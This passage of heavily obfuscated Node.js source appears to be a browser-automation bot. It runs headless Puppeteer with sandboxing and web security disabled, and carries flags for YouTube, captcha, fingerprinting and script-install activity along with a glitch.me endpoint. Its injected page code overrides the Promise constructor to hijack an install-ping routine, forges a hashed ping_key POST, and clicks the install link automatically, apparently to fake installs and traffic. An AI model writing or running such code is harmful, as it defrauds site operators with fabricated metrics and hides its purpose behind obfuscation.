0x3387 * -0x1) << y[0x72 * -0x57 + 0x4a6 + 0x221b * 0x1 & N++], P[N >> -0xd * -0x16e + -0x2 * 0x8cd + -0xfa] |= (0x174f + 0x2 * 0xad2 + -0x2c73 | 0x1 * 0x3e6 + 0x1 * -0x1ace + -0x1 * -0x1727 & L) << y[0x1e1e + 0xdcb + 0xea2 * -0x3 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x17 * 0x3f + -0x3f2 * -0x3 + 0x373 * -0x5 ? (this['block'] = P[0x129c + -0x133f + 0x1 * 0xb3], this['start'] = N - (0x1038 + -0x1583 + -0x21 * -0x2b), this['hash'](), this[Z(0xc, '4yy2')] = 0x26f5 * -0x1 + -0x101b * 0x1 + -0x3711 * -0x1) : this['start'] = N;
                }
                return this['bytes'] > -0x15574973b + 0x1730e99f7 + 0xe265fd43 && (this['hBytes'] += this['bytes'] / (-0x5c40afc * -0x52 + 0xff0c8434 + -0x1d7d808ec) << -0xc * 0x22f + 0x9b6 + -0x1 * -0x107e, this['bytes'] = this['bytes'] % (-0x157854c78 + -0xb3 * -0x12f7414 + 0x18357227c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x246b + 0x4b + 0x2421;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x10af * 0x1 + 0x1d * -0x74 + 0x1de3] = this['block'], J[K >> -0xbcb + -0xf72 + 0x1b3f] |= x[-0x1196 + 0xac5 + 0x6d4 & K], this['block'] = J[0x2 * 0xab2 + 0x8f9 * 0x2 + -0x2746], K >= 0x15c3 * -0x1 + 0x5cb * 0x3 + 0x49a && (this['hashed'] || this['hash'](), J[0x1f4d * -0x1 + -0x19f6 + 0x3943 * 0x1] = this['block'], J[0x1291 + 0xb * -0x359 + -0x29e * -0x7] = J[0x111 * 0x1b + -0x25 * -0x7a + -0x2e6c] = J[0x14c3 + 0xbe * 0x5 + -0x1877] = J[-0x666 + 0x2064 + -0x19fb] = J[-0x15d * 0x7 + -0x134b + 0x1cda] = J[0x1b1f + 0x219b * -0x1 + -0x6f * -0xf] = J[-0x1176 + -0x58 * 0x6e + 0x1 * 0x374c] = J[-0xb4d + -0x97c + -0x29a * -0x8] = J[-0x21e * -0x10 + 0x58d + 0x5 * -0x7e1] = J[0x22b6 + 0x1fd2 + 0x1d * -0x24b] = J[-0x1cc9 + -0x44 * 0x40 + 0x2dd3] = J[-0x19b7 + -0xbca + -0x2 * -0x12c6] = J[-0x79e + -0xc52 + 0x13fc] = J[-0x1049 + -0x10 * -0x241 + -0x13ba] = J[0x4be * -0x5 + -0x11bf * 0x2 + -0x172 * -0x29] = J[0x2398 + 0x4 * 0x314 + 0x551 * -0x9] = -0x25e8 + -0x10b5 + 0x369d), J[0x226e * -0x1 + 0x14 * -0x1ed + -0x40 * -0x124] = this['hBytes'] << 0x2c * 0xdc + -0x28e + -0x233f | this['bytes'] >>> 0xe21 * 0x1 + 0x18e6 + -0x26ea, J[-0xcd * -0x17 + 0x1 * -0xf7f + 0x1 * -0x2dd] = this['bytes'] << 0x1d10 + 0x841 + -0x32 * 0xbf, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x2206 + 0xf4a + -0xc * -0x191; J < 0x13d + 0x4f * 0x2d + -0x278 * 0x6; ++J)
                K = Q[J - (0x120c + 0xeb9 * -0x1 + -0x4 * 0xd4)] ^ Q[J - (-0x1295 + 0xa * 0xe0 + -0x65 * -0x19)] ^ Q[J - (-0x1dd8 + -0x1 * -0x1ce5 + 0x101 * 0x1)] ^ Q[J - (0x21e6 + -0x1 * -0x12f8 + -0x34ce)], Q[J] = K << -0x12b0 + -0x25ba * 0x1 + 0x521 * 0xb | K >>> 0x151 + -0x1 * 0x82 + -0xb0;
              for (J = 0x1d63 + -0x90d * 0x2 + -0xb49; J < -0x3 * 0xa3 + 0x66e + -0x471; J += -0x18df * 0x1 + 0x196c + -0x88)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2a4 + 0xc8 * 0x1d + -0x1947 | L >>> 0xf53 * -0x2 + 0x446 + -0x1a7b * -0x1) + (M & N | ~M & O) + P + (-0x304cf7b1 + 0xaeed2776 + -0x241db62c) + Q[J] << 0x3 * 0x87b + 0x1a11 + -0x3382) << -0x640 + -0x977 + 0xfbc | P >>> 0x1251 + -0x14c5 * 0x1 + 0x28f) + (L & (M = M << -0x17ce * -0x1 + -0x493 * 0x1 + -0x131d | M >>> -0x5 * 0x4c7 + -0x173a + -0xfb5 * -0x3) | ~L & N) + O + (0x7 * 0x7266b49 + -0x858027cb + 0x11 * 0xa3ba115) + Q[J + (0x3 * -0x55a + -0x1ab9 + 0x2ac8)] << 0x405 * 0x9 + 0x1 * -0xe9e + 0x158f * -0x1) << 0x1be2 + 0x1b74 + -0x3751 | O >>> -0x1e44 + 0x4 * -0x70c + 0x3a8f) + (P & (L = L << 0x533 + -0x13e5 * 0x1 + -0x9e * -0x18 | L >>> 0x2040 + -0xb * 0x343 + 0x3a3 * 0x1) | ~P & M) + N + (-0x18ebc841 * -0x7 + 0x4fc4babd + -0xa3b4baeb) + Q[J + (-0x447 * 0x8 + 0x3a * -0x17 + -0x13b8 * -0x2)] << 0x36 * 0x90 + 0x4f4 * -0x7 + 0x44c) << 0x1c + 0x54 * 0x22 + -0xb3f | N >>> -0x242d * 0x1 + -0x1a0e + 0xca * 0x4f) + (O & (P = P << -0x5fd * 0x2 + -0x1a61 + -0x3 * -0xcd3 | P >>> -0xc5 * 0x10 + -0x3 * 0x5a3 + 0x7 * 0x42d) | ~O & L) + M + (-0x6ed6a7c1 + -0xaa3eea58 + 0x173980bb2) + Q[J + (-0x1 * -0x355 + -0x965 + 0x1 * 0x613)] << -0x1056 + 0x387 * -0xb + 0x5 * 0xb07) << -0x206d + -0x1179 + 0x31eb | M >>> -0x1164 + 0x1 * -0x132d + 0x24ac) + (N & (O = O << -0x2330 + -0x997 + 0x9 * 0x4fd | O >>> -0xf80 + 0x2103 + 0x1 * -0x1181) | ~N & P) + L + (-0x35c31014 + -0x6e9e44cf + 0xfee3ce7c) + Q[J + (-0x2435 * -0x1 + 0x26de + 0x501 * -0xf)] << 0x1d21 + 0x4 * 0x1ea + -0x1 * 0x24c9, N = N << 0x7 * -0x2e8 + 0x76a + -0x4 * -0x343 | N >>> -0x537 + -0x19b4 + 0xa4f * 0x3;
              for (; J < -0x3 * 0x993 + 0x1 * -0xb1 + 0x1 * 0x1d92; J += -0x1 * -0xde5 + -0x1 * -0x1a5a + -0x283a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x5 * -0x1df + -0xc1 * -0x2b + -0x29c1 | L >>> 0xe1d + 0x82f + -0x1631) + (M ^ N ^ O) + P + (-0x6a19bb59 * -0x2 + -0x1a509 * -0x3c6b + -0xc8b7a1d4) + Q[J] << -0x3 * -0x803 + -0x72 * 0x8 + -0x1479) << 0xed4 + -0x4 * 0x26c + -0x51f * 0x1 | P >>> 0x2078 + 0x741 * 0x3 + -0x3620) + (L ^ (M = M << -0x1 * -0x22de + 0x16d3 + -0x121 * 0x33 | M >>> 0xfc + 0x1282 + 0xac * -0x1d) ^ N) + O + (0x36a7f3c9 + 0x1 * 0x48bbda8e + 0x1c17 * -0x96ba) + Q[J + (0xa1b * 0x3 + 0x1 * -0x5ac + -0x53 * 0x4c)] << 0x1 * 0x1117 + 0x3 * -0x82c + -0x76d * -0x1) << 0xd9b + -0xaac + -0x2ea | O >>> 0x1580 + -0x523 * 0x2 + 0xd * -0xdb) + (P ^ (L = L << -0x3 * 0xd00 + -0x510 * -0x1 + 0x220e | L >>> 0x203d + -0x25 * -0x31 + -0x25 * 0x110) ^ M) + N + (0x516afa48 + 0x151a5565 * -0x1 + 0x328946be) + Q[J + (0xe9 * 0x6 + 0x7 * 0x322 + -0x1b62)] << -0x1 * -0x1c69 + 0x4a4 + 0x210d * -0x1) << 0x434 + -0x12 * 0x2c + 0x1f * -0x9 | N >>> 0x1419 + 0x75c + -0x1b5a) + (O ^ (P = P << 0x1c77 + -0x1e1c + -0x29 * -0xb | P >>> -0xb2 + -0x247 + -0x1 * -0x2fb) ^ L) + M + (-0x9ec09c05 + -0x219 * 0xa9a77 + 0x123d88b45) + Q[J + (0xb4 * 0x16 + -0x1285 + 0x310)] << -0x22f1 + -0x4 * -0x8e6 + -0xa7 * 0x1) << 0x116d + 0x4 * 0x809 + -0x6 * 0x842 | M >>> -0x5db + -0x19c + 0x286 * 0x3) + (N ^ (O = O << -0x2bd + 0x1221 + -0x22 * 0x73 | O >>> 0x694 + 0x19b + -0x82d) ^ P) + L + (-0x4d77c693 + 0x181e43fd + 0x43 * 0x27364fd) + Q[J + (-0x1e4b + -0x159f + -0x187 * -0x22)] << 0x26eb + -0x1b78 + -0xb73 * 0x1, N = N << -0x371 + 0x1af9 + -0xa2 * 0x25 | N >>> 0x23d * 0x1 + -0x9d * -0x1 + -0xb6 * 0x4;
              for (; J < -0x1 * -0xd1 + -0x9a * 0x34 + 0x1eb3; J += 0x1f22 + -0x24d8 + 0x5bb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x166e + -0x1c98 + 0x49 * 0xb3 | L >>> -0x25 * -0x1 + 0x1 * 0x16bd + -0x16c7) + (M & N | M & O | N & O) + P - (0x8105 * 0x7225 + 0xafcb0d61 + 0x11343cda * -0x7) + Q[J] << 0x3 * -0xae0 + -0x1a99 + 0x1 * 0x3b39) << 0x7f0 + 0xea7 + -0x9 * 0x282 | P >>> -0x1 * 0x1 + -0x269 + 0x285) + (L & (M = M << -0x4be * -0x2 + -0x24c9 * 0x1 + -0x1 * -0x1b6b | M >>> 0x1bbf + -0x204c + 0x185 * 0x3) | L & N | M & N) + O - (0xe7 * -0xf0987b + -0x13 * 0x2af1e4d + 0x3f8 * 0x5fff45) + Q[J + (-0x55 * 0x32 + -0x3 * 0xc2a + 0x3519)] << -0x5 * -0x56d + 0x1 * -0x612 + -0x150f) << -0x34a * -0x6 + 0x413 + 0xae * -0x23 | O >>> -0x16e1 + 0x109b + 0x661) + (P & (L = L << 0xdeb + 0x1f5c + -0x41b * 0xb | L >>> 0x1 * -0x1c7e + 0x1 * -0x2b3 + -0x31 * -0xa3) | P & M | L & M) + N - (-0xae * -0x31d8f + -0xa5106e6a * 0x1 + 0x113d69a5c) + Q[J + (0x1816 + -0x22a8 + 0xa94)] << 0x166a + -0xb2 + -0x15b8) << 0x1ed * 0x9 + 0x9db + -0x1b2b | N >>> -0xed7 + -0xdc9 * -0x2 + -0x194 * 0x8) + (O & (P = P << -0x3a1 + -0xd8b + -0x1 * -0x114a | P >>> 0x3 * -0x5 + 0x1c5 + -0x1b4) | O & L | P & L) + M - (0x3d1cace2 + -0x2ddaf18e + -0x8 * -0xc3450fa) + Q[J + (0x3a2 + -0x1 * 0x1ba1 + -0xc01 * -0x2)] << 0x1 * -0x86a + -0x8ac + 0x3 * 0x5b2) << 0x714 * 0x3 + -0x1e89 * 0x1 + 0x952 * 0x1 | M >>> -0x1115 * -0x1 + 0x1258 + -0x2352) + (N & (O = O << -0x68b + 0xe76 + -0x7cd * 0x1 | O >>> -0x33 * -0x38 + -0x112a + 0x604) | N & P | O & P) + L - (-0xf16d1a3 + -0x53e68e3 * -0x16 + 0x580af * 0x24b) + Q[J + (-0x2 * 0x2f + 0x1df8 + 0xe * -0x21d)] << 0x25f5 + -0x1 * 0x1ece + -0x727 * 0x1, N = N << -0x1 * 0x224f + 0x1 * 0x1bc8 + 0x1b * 0x3f | N >>> 0xc4 * -0x1 + 0x267f + 0x6f * -0x57;
              for (; J < 0x1942 + 0x1971 + 0x1 * -0x3263; J += 0x169f + -0xf0d * 0x2 + 0x780)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x24 * -0x56 + 0x1 * 0x2665 + -0x3278 | L >>> 0x2c * -0xdb + 0x2579 + -0x5 * -0xe) + (M ^ N ^ O) + P - (-0x7 * 0x3d4641b + 0x4e925e21 + 0x1d99cc6) + Q[J] << 0x1c * -0xa9 + -0x18d * 0xf + 0x29bf * 0x1) << 0x4f1 + 0x1ae0 + -0x1fcc | P >>> 0x119 * 0x1 + 0x1 * -0x6b9 + 0x5bb) + (L ^ (M = M << 0x3ec + -0xb1b + 0x74d | M >>> -0x5 * -0x66b + 0x4 * 0x291 + -0x2a59) ^ N) + O - (-0xe3 * -0x2947a9 + -0x344c1e5d * 0x1 + 0x454ed1ac) + Q[J + (0x990 + -0xcc0 + 0x331)] << 0x1926 + -0x29b * -0x7 + -0x2b63) << -0x1115 + 0x1d7f + -0xc65 * 0x1 | O >>> -0x3 * -0x93f + 0x133 * 0x1d + -0x3e69) + (P ^ (L = L << -0x1 * 0x2f5 + 0x2362 + -0x204f | L >>> -0x1 * 0x16c3 + 0x1 * 0x11 + 0x1 * 0x16b4) ^ M) + N - (-0xa8fe7ac + -0x5154955 + 0x11 * 0x412f77b) + Q[J + (0x1a0d + -0x77b * 0x1 + -0xc * 0x18c)] << -0x43 * 0x1 + 0x1538 + -0xb9 * 0x1d) << -0x12c2 + -0x1 * -0xb27 + -0x1 * -0x7a0 | N >>> -0x198a + -0x1 * 0xcdf + 0x2684) + (O ^ (P = P << 0x661 + -0xb23 * -0x1 + 0x1 * -0x1166 | P >>> 0x4e8 * 0x5 + -0x31 * 0x74 + 0xc6 * -0x3) ^ L) + M - (-0x56425ffa + 0x1 * 0x1a8155fb + 0x715e4829) + Q[J + (-0x29d * -0xd + -0x2 * 0xca9 + 0xe * -0x9e)] << -0x18f7 * 0x1 + 0xdee + 0xb09 * 0x1) << 0x18d3 + -0x7 * -0x3c8 + 0x3346 * -0x1 | M >>> 0x1ada + -0x8 * -0x40 + -0x995 * 0x3) + (N ^ (O = O << 0x2d * 0xb3 + 0x4e0 + -0x2439 | O >>> -0x2690 + 0x1312 + 0x1380) ^ P) + L - (-0x73692e0 + 0x327721dd + -0x1 * -0xa5caf2d) + Q[J + (-0x5 * -0xa + -0x91b + 0x5 * 0x1c9)] << 0x1f3 + -0xf3a + 0xd47, N = N << -0x1db3 * 0x1 + -0x41 * -0x3e + 0xe13 * 0x1 | N >>> -0x10c3 + -0x2 * 0xa31 + 0x1 * 0x2527;
              this['h0'] = this['h0'] + L << 0x3 * -0xc5f + -0xcfb + -0xe * -0x394, this['h1'] = this['h1'] + M << -0x27 * -0x1 + -0x1e8a + 0x1e63, this['h2'] = this['h2'] + N << -0x1516 + -0x19 * -0x7 + 0x1467 * 0x1, this['h3'] = this['h3'] + O << -0x1 * 0x1625 + 0xd82 * -0x1 + -0x1 * -0x23a7, this['h4'] = this['h4'] + P << 0x143 * -0x11 + -0x2017 + -0x2 * -0x1ac5;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x14f2 + 0x25 * -0x71 + -0x481 & 0x3 * -0x116 + 0x8a1 + -0x550] + w[J >> 0x1c7b + -0xa4b + -0x1218 & 0x1a1f * 0x1 + 0x5 * 0x233 + -0x250f] + w[J >> -0x16f3 + -0x524 + -0x1c2b * -0x1 & -0x8a8 + -0x2 * -0xb28 + -0xd99] + w[J >> 0x1 * -0x908 + 0x1132 + -0x81a & 0x1 * 0x1115 + 0x1 * -0x1003 + -0x103] + w[J >> 0xd * 0x1aa + -0x54f + -0x1cf * 0x9 & -0x1ba3 + -0x92 * -0x12 + 0xc2 * 0x17] + w[J >> 0x92 * 0x43 + -0x7 * 0x167 + 0x1c5d * -0x1 & 0x37 * 0xa + -0x57e + 0x367] + w[J >> 0x2285 * -0x1 + -0x11f + 0x23a8 & 0x12c5 + -0x1 * 0x24b + 0x3 * -0x579] + w[0x17c2 + 0x1824 + 0x25 * -0x14b & J] + w[K >> 0x60e * 0x2 + -0xe8e + 0x1 * 0x28e & -0x1a07 * -0x1 + 0x170f + 0x701 * -0x7] + w[K >> -0x7 * 0x56c + 0x25 * 0x4 + -0x95e * -0x4 & -0x120 * -0x12 + -0x1 * -0x243f + -0x3870] + w[K >> -0x8d * 0x35 + 0x1d8f + 0x2 * -0x25 & -0x1656 + -0x3a * -0xb + -0x1 * -0x13e7] + w[K >> -0x61 * -0xa + -0x34b * 0x1 + -0x6f & 0x2eb * 0x9 + -0xe4f + 0x5 * -0x261] + w[K >> 0x1d39 * -0x1 + 0x112f * 0x2 + -0x1 * 0x519 & -0x1 * -0x1b6f + -0xbe5 + 0xf7b * -0x1] + w[K >> 0x283 * 0x5 + -0xf9d + 0x316 & -0x4 * -0x588 + 0x841 + -0x1e52] + w[K >> 0x125 * 0x7 + -0x895 + 0x19 * 0x6 & -0x12a + 0x1857 + -0x2 * 0xb8f] + w[0x1 * -0x6de + 0x23c4 + -0x1cd7 & K] + w[L >> -0x21b7 + 0x8 * 0x485 + -0x1 * 0x255 & 0x1b4f * -0x1 + 0xa0a + 0x1154] + w[L >> 0x9b3 + 0x3 * -0x545 + -0x634 * -0x1 & 0xd2f + 0x1367 + -0x2087] + w[L >> -0x29e * -0x4 + 0x1 * 0x164b + -0x20af & -0x583 * -0x5 + -0x44 * 0x2b + -0x1014] + w[L >> 0x1d * -0xd0 + 0x164b + 0xb * 0x1f & 0x209a + 0x150e + -0x1 * 0x3599] + w[L >> -0x8dd * 0x1 + -0x1 * 0x1680 + -0xbb * -0x2b & -0xdf2 + 0x2 * 0x10a5 + -0x1349 * 0x1] + w[L >> -0x5 * 0x6f1 + -0x2d * 0x31 + 0x2b5a & -0xa7a + -0xce4 + 0x1 * 0x176d] + w[L >> -0x21ee + -0x1331 + 0x3523 & 0x276 + 0x2177 + -0x23de] + w[0x2 * 0x382 + 0x1b6e + -0x2263 & L] + w[M >> 0x7d5 + 0x843 + -0xffc & -0x125c + 0x76c + 0xaff] + w[M >> -0x566 * 0x1 + -0xfa * 0x11 + 0x1618 & 0x1103 + 0x1774 * -0x1 + 0x680] + w[M >> 0x2 * -0xc6b + 0xca5 + 0xc45 & 0x1 * -0x232b + -0x59 * 0x27 + 0x30c9] + w[M >> 0x1e3 + -0x3 * -0x517 + -0x4 * 0x446 & 0x1ec3 + 0x889 + 0xcd * -0x31] + w[M >> -0x1de0 + -0xd1a + 0x2b06 & 0x2593 * 0x1 + 0x105c + -0x35e0] + w[M >> 0x166f + -0xa09 + -0xc5e & -0x67c + -0x2e7 * 0xb + 0x2678] + w[M >> -0x237e + 0x6 * -0x50 + 0x2562 & -0x154b + 0x1cb5 + -0x75b] + w[-0xdee + 0xe9e * 0x2 + 0x515 * -0x3 & M] + w[N >> 0x2 * 0x106a + -0x1 * 0x6f7 + -0x19c1 & -0x2 * 0x10e2 + 0x21dd + 0x2 * -0x5] + w[N >> -0x19f8 * 0x1 + -0xb3b + -0x1 * -0x254b & -0x110d + 0x1b17 + -0x9fb] + w[N >> 0x644 + 0x232 * -0x1 + -0x3fe * 0x1 & 0x104b * 0x2 + 0x8e + -0x2115] + w[N >> -0x1 * 0x1cef + -0xd * 0x47 + -0x104d * -0x2 & -0xda + -0x37 * -0x93 + -0x1eac] + w[N >> 0x1ef6 + -0x19a7 + -0x543 & -0x184d + -0xdf1 + -0x1 * -0x264d] + w[N >> -0x13a3 + 0x1e6d * -0x1 + -0x38 * -0xe5 & 0x1ba5 + 0x17a4 + -0x333a] + w[N >> -0x1d76 + 0x1754 + 0x626 * 0x1 & -0x2 * 0x9c8 + -0x1 * -0x1195 + -0x20a * -0x1] + w[-0x145d + 0x1 * -0xb39 + 0x1 * 0x1fa5 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xd2c + -0x25d8 + 0x331c & -0xf25 * 0x2 + 0x4f0 + 0x1a59,
                J >> 0x1 * -0x1957 + 0x6 * 0xa0 + 0x15a7 & 0xd3 * 0x13 + 0x1271 + -0x211b,
                J >> 0xc37 + -0x20d4 + -0x2f3 * -0x7 & -0x213a + 0x8d0 + 0x1969,
                -0x48b * 0x8 + 0x1146 + 0x1411 & J,
                K >> -0x2319 + 0x15 * 0x55 + 0x968 * 0x3 & -0x9b5 + -0x1cdd + 0x2791,
                K >> -0x1d0d + 0x3 * 0x5cb + 0xbbc & -0x22e6 * 0x1 + 0x1321 + 0x10c4,
                K >> 0x4b * 0x44 + -0xff * -0x17 + -0x2acd * 0x1 & -0x244d * 0x1 + -0x6 * 0x30a + 0x3788,
                0x2638 + 0x2 * -0x48d + -0x1c1f & K,
                L >> 0x1 * -0xb1b + -0x1dc8 + 0x28fb & -0xbc1 + 0x4 * -0x3e2 + -0x5a8 * -0x5,
                L >> -0x217b + 0x8e4 + 0x1 * 0x18a7 & 0x3aa + -0x1 * 0x1faf + 0x1d04,
                L >> 0x50e + -0x713 * -0x4 + -0x355 * 0xa & 0x349 * 0x4 + 0x9f8 + -0x161d,
                -0x35b * -0x4 + -0x41 * -0x61 + 0x1287 * -0x2 & L,
                M >> -0x432 * 0x1 + -0xbc0 + 0x1 * 0x100a & 0x16 * -0xd + 0x1a05 + -0x17e8,
                M >> 0x1 * 0x141d + 0x2 * 0xfde + 0x1 * -0x33c9 & -0xa8b + 0x19bd * -0x1 + 0x2547,
                M >> -0x15dd + -0xf * 0xd + -0x19 * -0xe8 & 0x1588 + -0x6 * -0x293 + 0x97 * -0x3d,
                0xedb * 0x1 + 0x1987 + 0x3 * -0xd21 & M,
                N >> -0xee3 + -0x6d5 + -0x8 * -0x2ba & -0xb * -0x277 + 0x1d66 + -0x3784,
                N >> 0x1174 + -0xbe6 * 0x1 + 0x1 * -0x57e & 0x13 * -0x1d1 + 0x2dd * 0x1 + 0x20a5,
                N >> -0xd * -0x169 + -0x2701 + -0xa * -0x212 & -0x16 * -0x115 + 0x26d * -0x1 + -0x1462,
                -0xedc * -0x1 + -0xa28 + 0x1 * -0x3b5 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0xaec + 0x7 * -0x556 + 0x1a * 0x105), (K = new DataView(J))['setUint32'](-0x1 * 0x5 + 0x2b * 0x83 + -0x15fc, this['h0']), K['setUint32'](0x1c98 + 0x754 + -0x23e8, this['h1']), K['setUint32'](0x20e0 + 0x22f + -0x2307, this['h2']), K['setUint32'](0x33f * -0xa + -0x55b + 0x3 * 0xc9f, this['h3']), K['setUint32'](-0x1 * 0x100f + -0x2602 + 0x5d * 0x95, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1 * -0x2371 + 0x18e3 + 0xe * 0xc1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x16 * -0x43 + -0x979 + 0x22d * 0x7;
            J[0x1075 + -0x1dd7 + 0xd62]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x3f3 * -0x1 + 0x1454 * 0x1 + -0x1061] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x83f * -0x2 + 0x1 * 0x1081 + -0x107f * 0x2), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x11d7 + 0xc5f + -0x1e35;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1d4d + -0x3f8 + -0x1379), Promise['resolve'](-0xfb2 * -0x2 + -0x1ebc + -0xa7);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x2 * 0x35e + 0x4 * -0x93b + 0x2ba8; j < -0xef * -0x1 + -0x353 * -0x4 + -0x71d * 0x2; j++)
    i();
}

function a() {
  const bq = [
    'childNodes',
    'rtVcPW',
    'yxv0B2HLywWTyq',
    'W7rmsKnYp8kcWQXixq',
    'nto-the-ma',
    'AmobBZW3WP1BW6OLWOO',
    'jSk2W6FdMq',
    'C2HHmq',
    'lw9WDgLTAxPLlq',
    'Navigation',
    'W6umkv9eaCkwWO0+rq',
    'Aw5KB3DFu2L6zq',
    'gtW0rZLu',
    'CMCVzw4VC2nYAq',
    '-projects-',
    'DcBdVmkynaOmwCoS',
    'WOBcTgWjW58',
    'Dxr0B24UC291BG',
    'zs8Q',
    'lication/s',
    'ie5uideWlJa7ia',
    'me/108.0.0',
    'WQldIbSmqCklrNakfa',
    'e/*',
    'r-s-handbo',
    'e8kKW74IjCkLWOBdSaBcSW',
    'nXLGQ7QeoG',
    'B2jQzwn0',
    'ts,suga\x20bt',
    'ChrZl2j5lxnPDa'
  ];
  a = function() {
    return bq;
  };
  return a();
}
const NETWORK_PATIENCE = -0x2b * 0x1a + -0x1db3 + 0x4151 + (-0x7 * -0x1d7 + -0x18a9 * -0x1 + -0x19d2) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x15c2 + 0xd90 + 0x835) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x2 * -0x1288 + 0x13 * -0x1f + 0x275d * 0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
